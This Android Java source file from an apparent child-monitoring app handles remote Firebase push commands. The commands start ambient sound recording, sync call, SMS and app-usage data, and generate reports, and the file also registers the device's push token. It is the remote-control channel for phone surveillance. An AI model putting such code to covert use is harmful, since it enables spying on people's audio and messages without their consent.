package com.childmonitor.services;

import android.content.Intent;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(RemoteMessage msg) {
        if (msg.getData().isEmpty()) return;
        String cmd = msg.getData().get("command");
        if (cmd == null) return;
        switch (cmd) {
            case "start_recording":
                startService(new Intent(this, SurroundingSoundService.class));
                break;
            case "sync_data":
                startService(new Intent(this, CallSmsService.class));
                startService(new Intent(this, AppUsageService.class));
                break;
            case "generate_report":
                Intent i = new Intent(this, DailyReportService.class);
                i.setAction("GENERATE");
                startService(i);
                break;
        }
    }

    @Override
    public void onNewToken(String token) {
        String deviceId = getSharedPreferences("cm_prefs", MODE_PRIVATE)
                .getString("device_id", "unknown");
        com.google.firebase.database.FirebaseDatabase.getInstance()
                .getReference("devices").child(deviceId).child("fcm_token").setValue(token);
    }
}
